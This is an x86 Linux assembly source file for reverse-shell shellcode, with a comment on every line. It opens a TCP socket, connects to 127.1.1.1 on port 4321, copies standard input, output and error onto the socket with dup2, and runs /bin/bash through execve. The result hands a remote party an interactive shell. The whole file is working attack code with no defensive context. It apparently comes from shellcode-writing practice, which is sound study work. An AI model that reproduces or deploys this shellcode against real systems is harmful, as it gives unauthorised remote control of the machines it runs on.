global _start			

section .text
_start:

	;I. int socketcall(int call, unsigned long *args)
	;
	; a. int socket(int domain, int type, int protocol)
	xor eax, eax		;set eax to 0
	xor ebx, ebx		;set ebx to 0
	xor ecx, ecx		;set ecx to 0
	push ecx		;tcp protocol = 0
	push byte 0x1		;sock_stream/type = 1
	push byte 0x2		;PF_INET/domain = 2
	mov ecx, esp		;pointer to socket args
	mov bl, 0x1		;set ebx to call type sys_socket = 1
	mov al, 0x66		;set eax to syscall socketcall = 102
	int 0x80		;interupt

	; b. int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
	mov esi, eax		;save sockfd return value from socket()
	inc ebx			;set ebx to 2 for sa_family in struct sockaddr
	push 0x0101017f		;sockaddr = 127.1.1.1 (big endian)
	push word 0xe110	;port = 4321 (big endian)
	push bx			;sa_family = 2
	mov ecx, esp		;pointer to struct sockaddr args
	push byte 0x10		;socklen = 16
	push ecx		;pointer to sockaddr
	push esi		;sockfd from socket()
	mov ecx, esp		;pointer to connect args
	inc ebx			;set ebx to call type sys_connect = 3
	mov al, 0x66		;set socketcall() syscall = 102
	int 0x80		;interupt

	;II. int dup2(int oldfd, int newfd)
	mov ebx, esi		;old sockfd
	xor ecx, ecx		;stdin
test:
	mov al, 0x3f		;dup2 syscall
	int 0x80		;interupt
	inc ecx			;stdin-->stdout-->stderr
	cmp cl, 0x3		;compare ecx
	jne test		;loopback for stdout, and stderr

	;III. int execve(const char *filename, char *const argv[], char *const envp[])
	xor edx, edx		;set to NULL for filename terminator and envp
	push edx		;NULL terminator for filename
	push 0x68736162		;hsab
	push 0x2f2f2f2f		;////
	push 0x6e69622f		;nib/
	mov ebx, esp		;pointer to filename
	xor ecx, ecx		;set to NULL for argv
	mov al, 0xb		;execve syscall = 11
	int 0x80		;interupt

